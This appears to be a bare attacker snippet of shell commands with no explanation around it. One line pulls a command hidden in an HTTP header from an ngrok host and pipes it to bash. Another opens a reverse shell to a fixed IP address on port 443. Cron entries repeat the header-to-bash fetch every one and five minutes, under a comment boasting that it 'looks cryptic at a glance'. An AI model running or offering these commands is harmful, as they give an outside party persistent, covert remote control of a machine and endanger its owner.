curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash

/bin/bash -i >& /dev/tcp/176.160.153.17/443 0>&1
#cron job

# Looks cryptic at a glance
*/1 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
*/5 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^lee:' | cut -d':' -f2- | xargs | bash
